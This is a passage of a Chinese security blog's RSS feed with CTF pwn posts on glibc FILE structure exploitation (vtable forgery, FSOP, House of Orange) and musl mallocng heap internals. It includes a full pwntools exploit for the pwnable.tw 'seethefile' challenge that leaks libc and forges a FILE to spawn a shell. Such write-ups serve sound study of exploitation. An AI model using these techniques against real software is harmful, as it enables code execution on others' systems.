addr_binsh</li></ul><p>在理想的堆风水情况下，只需要任意写一次，即可通过 <code>exit()</code> 拿到 shell</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;持续更新（或许）&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="https://humoooor.cn/categories/Pwn/"/>
    
    
    <category term="Musl libc" scheme="https://humoooor.cn/tags/Musl-libc/"/>
    
  </entry>
  
  <entry>
    <title>FILE Exploration</title>
    <link href="https://humoooor.cn/2022/10/11/FILE%20Exploration/"/>
    <id>https://humoooor.cn/2022/10/11/FILE%20Exploration/</id>
    <published>2022-10-11T03:15:00.000Z</published>
    <updated>2023-10-04T11:49:18.496Z</updated>
    
    <content type="html"><![CDATA[<p>系统地学一下 glibc 文件结构的洞</p><span id="more"></span><h2 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h2><figure class="highlight c"><figcaption><span>./libio/libio.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>_IO_FILE<ul><li>_flags<ul><li>记录文件流的属性<ul><li>Read only</li><li>Append</li><li>…</li></ul></li></ul></li><li>Stream buffer<ul><li>Read buffer<ul><li>_IO_read_ptr</li><li>_IO_read_end</li><li>_IO_read_base</li></ul></li><li>Write buffer<ul><li>_IO_write_ptr</li><li>_IO_write_end</li><li>_IO_write_base</li></ul></li><li>Reserve buffer<ul><li>_IO_buf_base</li><li>_IO_buf_end</li></ul></li></ul></li><li>_fileno<ul><li>文件描述符</li></ul></li><li>_chain<ul><li>FILE 结构体是一个尾插法单向链表，默认有 stderr -&gt; stdout -&gt; stdin</li></ul></li><li>_lock<ul><li>避免多线程的条件竞争</li><li>在攻击时通常需要构造它<ul><li>使其指向一个全是0的空间</li></ul></li></ul></li></ul></li><li>_IO_FILE_plus<ul><li>stdin/stdout/stderr/fopen 使用这个结构体</li><li>_IO_FILE</li><li>vtable<ul><li>所有对文件的操作都是通过 vtable</li></ul></li></ul></li></ul><h2 id="fopen-流程"><a href="#fopen-流程" class="headerlink" title="fopen 流程"></a>fopen 流程</h2><ol><li>分配 FILE 结构体空间<ul><li>malloc</li></ul></li><li>初始化 FILE 结构体<ul><li>_IO_new_file_init_internal</li></ul></li><li>把 FILE 结构体放入链表<ul><li>_IO_link_in</li></ul></li><li>打开文件<ul><li>_IO_new_file_open</li><li>sys_open</li></ul></li></ol><h2 id="fread-流程"><a href="#fread-流程" class="headerlink" title="fread 流程"></a>fread 流程</h2><ol><li>如果 stream buffer 是空的<ul><li>vtable -&gt; _IO_file_xsgetn</li><li>分配 buffer<ul><li>vtable -&gt; _IO_file_doallocate</li></ul></li></ul></li><li>读取数据到 stream buffer 中<ul><li>vtable -&gt; _IO_file_underflow</li></ul></li><li>把数据从 stream buffer 复制到目的地址<ul><li>sys_read</li></ul></li></ol><h2 id="fwrite-流程"><a href="#fwrite-流程" class="headerlink" title="fwrite 流程"></a>fwrite 流程</h2><ol><li>如果 steam buffer 是空的<ul><li>vtable -&gt; _IO_file_xsputn</li><li>分配 buffer<ul><li>vtable -&gt; _IO_file_doallocate</li></ul></li></ul></li><li>复制用户数据到 stream buffer</li><li>如果 stream buffer 满了或者要刷新 steam buffer，将 steam buffer 的数据写入文件<ul><li>sys_write</li></ul></li></ol><h2 id="fclose-流程"><a href="#fclose-流程" class="headerlink" title="fclose 流程"></a>fclose 流程</h2><ol><li>把 FILE 结构从链表中移除<ul><li>_IO_unlink_it</li></ul></li><li>刷新并释放 stream buffer<ul><li>_IO_new_file_close_it</li><li>_IO_do_flush</li></ul></li><li>关闭文件<ul><li>sys_close</li></ul></li><li>释放 FILE 结构<ul><li>vtable -&gt; _IO_file_finish</li><li>free</li></ul></li></ol><h2 id="伪造-vtable"><a href="#伪造-vtable" class="headerlink" title="伪造 vtable"></a>伪造 vtable</h2><p>伪造 FILE 结构，将 vtable 指向构造的函数</p><ol><li>修改 _lock 指向一个全为 0 的内存</li><li>找到 vtable 的偏移</li><li>修改 vtable 指向可控的内存</li><li>调试查看 close 时会 call 的位置和 rdi 参数</li><li>将对应位置改成 system 和 /bin/sh</li></ol><p>注：一般 rdi 的值为 _flags + 后面四个字节，所以一般前 8 个字节设置为 <code>AAAA;sh;</code></p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>File-Stream Oriented Programming</p><ul><li><p>控制文件结构链表</p><ul><li>_chain</li><li>_IO_list_all 全局变量，链表头</li></ul></li><li><p>IO_flush_all_lockp</p><ul><li>用于刷新所有 FILE 的缓存</li><li>调用条件<ul><li>当 libc 执行 abort 时</li><li>当执行 exit 时</li><li>当从 main 返回时</li></ul></li><li>在调用时，如果 <code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 会调用 <code>vtable-&gt;_IO_overflow</code></li></ul></li></ul><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><ul><li>利用 Unsorted bin attack 把 unsorted bin 写到 _IO_list_all</li><li>构造 0x60 大小的 chunk 放入 small bin</li><li>调用 _IO_flush_all_lockp 有 50% 概率把 0x60 大小的 chunk 作为 FILE 结构造成 FSOP</li></ul><h2 id="Pwnable-seethefile"><a href="#Pwnable-seethefile" class="headerlink" title="Pwnable seethefile"></a>Pwnable seethefile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure><p>利用点</p><ul><li>读取 <code>/proc/self/maps</code> 得到 libc 地址</li><li>在 <code>case 5</code> 的时候 name 溢出覆盖 fp 到 fake_file，<code>fclose(fp)</code>时就可以使用伪造的 vtable</li></ul><p>主要需要调试找到 _lock、vtable 和调用 vtable 中的函数的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;chall.pwnable.tw:10200&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">p = remote(address[<span class="number">0</span>], address[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># p = process(__file__[0:-3])</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fopen</span>(<span class="params">filename</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fread</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fwrite</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln_exit</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">addr_fake_file = elf.sym[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">addr_fp = elf.sym[<span class="string">&quot;fp&quot;</span>]</span><br><span class="line">offset_fp = addr_fp - addr_fake_file</span><br><span class="line">offset_lock = <span class="number">0x48</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_vtable = <span class="number">0x94</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_call = <span class="number">0x44</span> <span class="comment"># addr_vtable + _</span></span><br><span class="line"></span><br><span class="line">fopen(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line"><span class="comment"># addr_libc = int(p.recv(8), 16)</span></span><br><span class="line">addr_libc = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) + <span class="number">0x1000</span></span><br><span class="line"><span class="comment"># info(&quot;libc addr =&gt; &quot; + hex(addr_libc))</span></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p32(addr_system) * <span class="number">6</span></span><br><span class="line">payload = (fake_file).ljust(offset_fp, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file)</span><br><span class="line">payload = (payload).ljust(offset_lock, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + offset_vtable + <span class="number">4</span>)</span><br><span class="line">payload = (payload).ljust(offset_vtable, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + <span class="number">8</span> - offset_call)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x8048b0f&quot;)</span></span><br><span class="line"></span><br><span class="line">vuln_exit(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;系统地学一下 glibc 文件结构的洞&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="https://humoooor.cn/categories/Pwn/"/>
    
    
    <category term="FILE" scheme="https://humoooor.cn/tags/FILE/"/>
    
  </entry>
  
  <entry>
    <title>Musl heap 浅析</title>
    <link href="https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"/>
    <id>https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/</id>
    <published>2022-10-10T08:26:00.000Z</published>
    <updated>2023-10-04T11:47:56.207Z</updated>
    
    <content type="html"><![CDATA[<p>浅浅分析一下</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>环境：x64 musl-1.2.2</p><p>笔者只浅浅分析了 malloc 和 free 的源码，对相关结构没有详细介绍，可配合 xf1les 师傅的<a href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">文章</a>食用</p><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>实际上源码并没有 chunk 结构体定义，下面是通过 malloc 推测出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> prev_data[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> idx:<span class="number">5</span>;  <span class="comment">// group 的第几个 chunk，从 0 开始</span></span><br><span class="line">    <span class="type">uint8_t</span> reserved:<span class="number">3</span>; <span class="comment">// chunk 没有用到的空间大小，若 reserved = 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">// 相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10</span></span><br><span class="line">    <span class="type">char</span> data[]; <span class="comment">// 用户数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>prev_data</strong><ul><li>空间复用，前一个 chunk 可以多使用 4 个字节</li></ul></li><li><strong>idx</strong><ul><li>group 的第几个 chunk，从 0 开始</li></ul></li><li><strong>reserved</strong><ul><li>chunk 没有用到的空间大小</li><li>若 reserved == 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved</li></ul></li><li><strong>offset</strong><ul><li>相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10</li></ul></li></ul><p>由于内存对齐，每个 chunk 可以使用下一个 chunk 的 4 字节空间</p><p>（每个 group 的第一个 chunk 前面有 0x10 个字节 = group + chunk_header）</p><h4 id="inuse-chunk"><a href="#inuse-chunk" class="headerlink" title="inuse_chunk"></a>inuse_chunk</h4><p>avail_mask 和 freed_mask 对应的位置都为 0</p><h4 id="unuse-chunk"><a href="#unuse-chunk" class="headerlink" title="unuse_chunk"></a>unuse_chunk</h4><ul><li><p><strong>avail_chunk</strong></p><ul><li>内容一般为空</li><li>avail_mask 上 idx 对应的位置为 1</li></ul></li><li><p><strong>freed_chunk</strong></p><ul><li>idx 和 reserved 置为 0xff，offset 置零</li><li>freed_mask 上 idx 对应的位置为 1</li></ul></li></ul><h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// 对应的 meta 地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;<span class="comment">// last_chunk_idx</span></span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];   <span class="comment">// alien</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由 meta 管理，位于可执行文件的数据段</p><ul><li><strong>meta</strong><ul><li>对应的 meta 地址</li></ul></li><li><strong>active_idx</strong><ul><li>可用的 chunk 的最大 idx</li></ul></li><li><strong>pad</strong><ul><li>填充位，用于对齐</li></ul></li><li><strong>storage</strong><ul><li>存储数据，chunks</li></ul></li></ul><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">// 同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 指向对应的 group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;  <span class="comment">// 以位图方式表示 group 中 chunk 状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">// group 中 chunk 数量</span></span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// meta 是否可以被回收，1 表示可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// 作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte）</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>prev</strong>，<strong>next</strong><ul><li>同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接</li></ul></li><li><strong>mem</strong><ul><li>指向对应的 group 地址</li></ul></li><li><strong>avail_mask</strong>，<strong>freed_mask</strong><ul><li>以位图方式表示 group 中 chunk 状态，因此一个 group 最多能有 32 个 chunk</li><li>0 表示 inuse，1 表示 avail 或 freed</li><li>chunk 分为 inuse_chunk、avail_chunk、freed_chunk 三个状态</li></ul></li><li><strong>last_idx</strong><ul><li>group 中 chunk 数量</li></ul></li><li><strong>freeable</strong><ul><li>meta 是否可以被回收，1 表示可以</li></ul></li><li><strong>sizeclass</strong><ul><li>作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte）</li></ul></li></ul><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line"><span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line"><span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line"><span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line"><span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line"><span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line"><span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line"><span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line"><span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line"><span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>maplen</strong><ul><li>若 group 是 mmap 分配的空间，为对应的长度，其他情况为 0</li></ul></li></ul><h4 id="avail-meta"><a href="#avail-meta" class="headerlink" title="avail_meta"></a>avail_meta</h4><p>在 meta_area 中按顺序取出，avail_meta = {0}</p><h4 id="freed-meta"><a href="#freed-meta" class="headerlink" title="freed_meta"></a>freed_meta</h4><ul><li>FIFO，malloc_context 中 freed_meta_head 指向第一个 freed_meta</li><li>meta-&gt;mem-&gt;meta = 0</li><li>freed_meta = {0}</li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;<span class="comment">// 与 malloc_context 中的 secret 相等，防止伪造 meta</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// 下一个 meta_area 的地址</span></span><br><span class="line"><span class="type">int</span> nslots;<span class="comment">// meta 槽的数量</span></span><br><span class="line"><span 